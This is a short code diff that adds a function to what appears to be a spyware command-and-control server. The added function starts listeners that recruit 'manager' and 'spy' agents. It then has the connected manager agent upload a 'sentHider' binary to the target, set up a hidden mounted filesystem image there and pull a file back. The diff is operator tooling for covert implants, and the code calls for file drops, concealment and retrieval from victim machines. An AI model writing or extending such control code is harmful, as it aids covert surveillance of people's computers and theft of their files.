@@ -107,5 +107,39 @@ def main_with_ui():
             value = input(f"$ ")
 
 
+def another_main():
+    targetHiderPath = "./sentHider.o"
+
+    image_path = "fs.iso"
+    mount_path = "fs"
+
+    operDict: dict[str, Operation] = dict()
+    # recrutionEvent = threading.Event()
+    manegerRecruiter = AgentRecruiter(HOST, PORT_MANEGER, operDict, "maneger")
+    spyRecruiter = AgentRecruiter(HOST, PORT_SPYWARE, operDict, "spy")
+    manegerRecruiter.start()
+    spyRecruiter.start()
+
+    while len(operDict) == 0:
+        sleep(1)
+    sleep(1)
+    ic(operDict)
+    op: Operation = list(operDict.values())[0]
+    ic(op)
+    ic(op.managerAgent)
+    ic(op.spyAgent)
+
+    manegerAgent: Agent = op.managerAgent
+
+    print(
+        manegerAgent.write_file(
+            "hider",
+            targetHiderPath,
+        )
+    )
+
+    print(manegerAgent.hider_setup(targetHiderPath, image_path, mount_path))
+    print(manegerAgent.retrieve_file('fishTest.txt'))
+
 if __name__ == "__main__":
     main_with_ui()
